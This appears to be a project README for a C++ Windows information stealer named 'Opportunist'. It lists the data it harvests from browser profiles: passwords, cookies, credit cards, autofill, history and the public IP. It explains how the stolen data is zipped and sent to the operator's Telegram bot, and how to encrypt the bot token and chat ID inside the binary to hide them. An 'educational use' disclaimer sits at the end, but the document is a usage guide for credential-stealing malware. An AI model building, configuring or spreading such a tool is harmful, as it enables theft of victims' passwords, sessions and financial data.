# Opportunist

This C++ application grabs user data from browser profiles, packs it into a `.zip` file, and sends it to a Telegram bot. It keeps things simple yet effective at roughly 1313 KB (release).

## Highlights

- Collects:
  - Browser history
  - Bookmarks
  - Autofill data
  - Passwords
  - Cookies
  - Downloads
  - Credit card info
  - System details
  - Public IP address
- Zips everything up.
- Sends it to your Telegram bot.

## Setup

### Requirements

1. **Windows OS:** Built to run on Windows.
2. **Dependencies:**
   - `sqlite3`
   - `miniz`
   - Windows APIs (`winsock2`, `winhttp`, etc.)

### Steps to Get Started

1. Clone the repo and head to the project folder.
2. Make sure these files are in place:
   - `main.cpp`
   - `TelegramMessageSender.cpp` & `TelegramMessageSender.h`
   - `DataRetriever.cpp` & `DataRetriever.h`
   - `Compression.cpp` & `Compression.h`
   - `BrowserInfo.cpp` & `BrowserInfo.h`
   - `Utilities.cpp` & `Utilities.h`
3. Run the provided PowerShell script (`encrypt.ps1`) to encrypt your bot token and chat ID.

### Encrypting Bot Token and Chat ID

1. Open PowerShell and execute the script:
   ```powershell
   ./encrypt.ps1
   ```
2. Provide your Telegram bot token and chat ID when prompted.
3. Copy the encrypted byte arrays from the output.
4. Replace the `BotToken` and `ChatId` vectors in `main.cpp` with the encrypted values:
   ```cpp
   const std::vector<uint8_t> BotToken = { /* Encrypted bytes */ };
   const std::vector<uint8_t> ChatId = { /* Encrypted bytes */ };
   ```
For example, after pasting in the values from the script, your `main.cpp` might look like this:
  ```cpp
  const std::vector<uint8_t> BotToken = { 0x2d, 0x10, 0x1c, 0x1b };
  const std::vector<uint8_t> ChatId = { 0x17, 0x17, 0x0c };
  ```

### Build It

1. Use any C++ compiler or IDE you like (e.g., Visual Studio).
2. Build and run the executable.

### Run It

1. The program will:
   - Scan for browser profiles in the `LocalAppData` directory.
   - Collect data and compress it into a `.zip` file.
   - Send the file to your Telegram bot.
2. If it doesn't find data or runs into an issue, it simply ignores.

## Note

- Decryption (`main.cpp`) must align with the encryption from the PowerShell script.

## License

This project is under the [The Unlicense](LICENSE). Do what you want with it.

## Disclaimer

This software is for educational use. Ensure you comply with all relevant laws and guidelines when using it.

By using this software, you agree that the author is not liable for any damage, loss, legal consequences, or other issues resulting from its use. Use it entirely at your own risk.
